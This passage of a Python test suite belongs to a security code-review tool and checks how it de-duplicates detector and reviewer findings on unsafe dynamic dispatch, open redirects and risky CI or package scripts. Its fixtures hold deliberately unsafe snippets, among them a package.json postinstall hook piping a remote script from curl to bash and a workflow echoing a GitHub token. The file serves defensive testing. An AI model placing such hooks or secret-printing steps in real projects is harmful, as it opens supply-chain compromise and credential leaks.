            "public_send dynamically invokes a user-selected method.",
        ),
    ]

    for index, (file_path, source, detector_category, reviewer_category, message) in enumerate(cases):
        diff = _summary(file_path, source)
        detector = _security_finding(
            f"detector-{index}",
            file_path,
            1,
            detector_category,
            "Dynamic dispatch/runtime execution API used."
            if reviewer_category in {"unsafe-dynamic-call", "unsafe-reflection"}
            else "Deterministic security sink detected.",
            detector=True,
        )
        reviewer = _security_finding(
            f"reviewer-{index}",
            file_path,
            2,
            reviewer_category,
            message,
        )

        changed = reanchor_security_detector_duplicates([detector, reviewer], diff)

        assert changed == [reviewer]
        assert (reviewer.line, reviewer.category) == (1, detector_category)


def test_dynamic_call_anchor_does_not_merge_into_same_line_eval_detector():
    file_path = "src/job.rb"
    diff = _summary(file_path, "send(name, payload); eval(payload)")
    eval_detector = _security_finding(
        "eval-detector",
        file_path,
        1,
        "code-injection",
        "Ruby eval usage detected.",
        detector=True,
    )
    send_reviewer = _security_finding(
        "send-reviewer",
        file_path,
        1,
        "unsafe-dynamic-call",
        "send(name, payload) dynamically invokes a user-selected method.",
    )

    assert reanchor_security_detector_duplicates([eval_detector, send_reviewer], diff) == []
    assert send_reviewer.category == "unsafe-dynamic-call"


def test_unsafe_reflection_anchor_requires_ruby_dynamic_dispatch_detector_evidence():
    file_path = "src/job.rb"
    diff = _summary(file_path, "send(name, payload)")
    unrelated_detector = _security_finding(
        "eval-detector",
        file_path,
        1,
        "code-injection",
        "Ruby eval usage detected.",
        detector=True,
    )
    reviewer = _security_finding(
        "reflection-reviewer",
        file_path,
        1,
        "unsafe-reflection",
        "send(name, payload) dynamically invokes a user-selected method.",
    )

    assert reanchor_security_detector_duplicates([unrelated_detector, reviewer], diff) == []
    assert reviewer.category == "unsafe-reflection"


def test_unsafe_reflection_anchor_does_not_merge_non_ruby_reflection():
    file_path = "src/Reflect.java"
    diff = _summary(file_path, "send(name, payload);")
    detector = _security_finding(
        "detector",
        file_path,
        1,
        "code-injection",
        "Dynamic dispatch/runtime execution API used.",
        detector=True,
    )
    reviewer = _security_finding(
        "reviewer",
        file_path,
        1,
        "unsafe-reflection",
        "send(name, payload) performs reflective dispatch.",
    )

    assert reanchor_security_detector_duplicates([detector, reviewer], diff) == []
    assert reviewer.category == "unsafe-reflection"


def test_reanchors_generic_workflow_secret_output_to_the_only_print_sink():
    file_path = ".github/workflows/review.yml"
    diff = _summary(
        file_path,
        '''steps:
  - uses: actions/checkout@v4
    with:
      ref: ${{ github.event.pull_request.head.sha }}
  - name: diagnostics
    run: echo "token=${{ secrets.GITHUB_TOKEN }}"''',
    )
    detector = _security_finding(
        "detector", file_path, 6, "data-leak", "Workflow prints a secret value.", detector=True
    )
    reviewer = _security_finding(
        "reviewer", file_path, 4, "hardcoded-secrets", "The GitHub token is printed to the job log."
    )

    changed = reanchor_security_detector_duplicates([detector, reviewer], diff)

    assert changed == [reviewer]
    assert (reviewer.line, reviewer.category) == (6, "data-leak")


def test_reanchors_manifest_unsafe_script_alias_to_remote_install_sink():
    file_path = "package.json"
    diff = _summary(
        file_path,
        """{
  "scripts": {
    "postinstall": "curl -s https://example.invalid/install.sh | bash"
  }
}""",
    )
    detector = _security_finding(
        "detector", file_path, 3, "supply-chain-risk", "Remote script is piped to shell.", detector=True
    )
    reviewer = _security_finding(
        "reviewer", file_path, 2, "unsafe-script", "The postinstall curl command pipes code to bash."
    )

    changed = reanchor_security_detector_duplicates([detector, reviewer], diff)

    assert changed == [reviewer]
    assert (reviewer.line, reviewer.category) == (3, "supply-chain-risk")


def test_rejects_python_url_builder_without_redirect_sink_but_keeps_real_redirect():
    file_path = "gauntlet_decoys/prompt_injection.py"
    diff = _summary(
        file_path,
        """def redirect_destination(next_url: str) -> str:
    return next_url


def perform_redirect(next_url: str):
    return RedirectResponse(url=next_url)""",
    )
    builder = _security_finding(
        "builder",
        file_path,
        3,
        "open-redirect",
        "函数 `redirect_destination` 直接返回未经验证的 next_url。",
    )
    real_redirect = _security_finding(
        "real", file_path, 5, "open-redirect", "perform_redirect passes next_url to RedirectResponse."
    )
    detector = _security_finding(
        "detector", file_path, 1, "open-redirect", "Redirect target is dynamic.", detector=True
    )

    rejected = unsupported_python_open_redirect_findings([builder, real_redirect, detector], diff)

    assert rejected == [builder]


def test_python_open_redirect_gate_fails_open_for_truncated_patch():
    file_path = "src/redirects.py"
    patch = "@@ -20,0 +20,2 @@\n+def redirect_destination(next_url):\n+    return next_url"
    finding = _security_finding("builder", file_path, 20, "open-redirect", "redirect_destination returns next_url.")

    assert unsupported_python_open_redirect_findings([finding], patch) == []


def test_rejects_misanchored_python_open_redirect_when_complete_file_has_no_redirect_api():
    file_path = "gauntlet_decoys/prompt_injection.py"
    diff = _summary(
        file_path,
        """from urllib.parse import urlparse

def validated_destination(next_url: str) -> str:
    parsed = urlparse(next_url)
    if parsed.netloc:
        return "/home"
    return next_url

def redirect_destination(next_url: str) -> str:
    return next_url""",
    )
    whitespace_anchor = _security_finding(
        "whitespace",
        file_path,
        2,
        "open-redirect",
        "An unvalidated destination may send the user to an attacker-controlled URL.",
    )

    assert unsupported_python_open_redirect_findings([whitespace_anchor], diff) == [whitespace_anchor]


def test_misanchored_python_open_redirect_remains_uncertain_when_file_has_redirect_api():
    file_path = "src/redirects.py"
    diff = _summary(
        file_path,
        """def redirect_destination(next_url: str) -> str:
    return next_url

def perform_redirect(next_url: str):
    return RedirectResponse(url=next_url)""",
    )
    whitespace_anchor = _security_finding(
        "whitespace",
        file_path,
        3,
        "open-redirect",
        "An unvalidated destination may redirect users.",
    )

    assert unsupported_python_open_redirect_findings([whitespace_anchor], diff) == []
